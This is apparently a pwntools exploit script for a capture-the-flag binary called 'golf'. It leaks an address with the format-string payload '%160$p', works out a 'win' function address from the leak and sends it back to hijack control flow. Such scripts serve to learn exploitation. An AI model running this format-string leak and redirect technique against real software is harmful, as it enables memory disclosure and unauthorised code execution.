from pwn import *

p= process('./golf')
gdb.attach(p)
p.recvuntil("?:")
p.sendline(b"%160$p")
p.recvuntil("0x")
leak =int(p.recvline(),16)

win_addr = leak - 0x29
print(hex(leak))
print(hex(win_addr))
pause()
p.recvuntil("!:")
p.sendline(hex(win_addr).encode())

p.interactive()